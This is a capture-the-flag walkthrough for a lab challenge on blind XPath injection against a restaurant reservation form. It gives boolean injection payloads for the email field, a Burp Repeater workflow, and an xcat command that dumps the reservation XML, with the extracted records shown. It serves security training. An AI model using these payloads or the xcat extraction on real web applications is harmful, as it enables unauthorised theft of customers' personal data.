# Challenge #1 - Deliccio 1

## Objectives

- Each customer can book a table and leave any particular information for the reservation. The web application stores the reservation in an xml file. Extract all the reservation of the day.

## Hints

- Recommended tools
  - Burps suite
  - Web Browser
  - XPath Blind Explorer 1.0

## What you will learn

- How to exploit XPath 1.0 Blind Injection
- How to extract information from an xml file through a blind XPath injection
- How to use XPath Blind Explorer 1.0
- How to craft XPath Blind Explorer requests with Burp Proxy

## Steps

Click in 'Book your seat' and make a reservation.

```
Name: example
E-mail: example@email.com
Phone: 123
Lenght: 2
```

With burp enabled, go to 'Check your reservation' page and send with the reservation email.

```
http://1.challenge.xpath.site/checkreservation.php
```

Response
```
The reservation is <span>confirmed</span>!
```

On the burp side, send the request to repeater and replace the email parameter with the payloads below.

True condition
```
email=' or '1'='1
```

Response
```
The reservation is <span>confirmed</span>!
```

False condition
```
email=' or '1'='2
```

Response
```
There is no reservation that corresponds to the data entered..
```

Download the last version of XCat.

```
https://github.com/orf/xcat
```

Execute the command below to run xcat.

```
xcat run -m POST http://1.challenge.xpath.site/checkreservation.php email email="example@email.com" -ts 'confirmed' -e FORM

<reservations>
	<reservation>
		<id>
			1
		</id>
		<fullname>
			Amelia Sandoval
		</fullname>
		<email>
			f1rs7@3mail.c0m
		</email>
		<phone>
			45696283863
		</phone>
		<res_lenght>
			4
		</res_lenght>
		<info>
			No secret here..
		</info>
	</reservation>
[...]
```
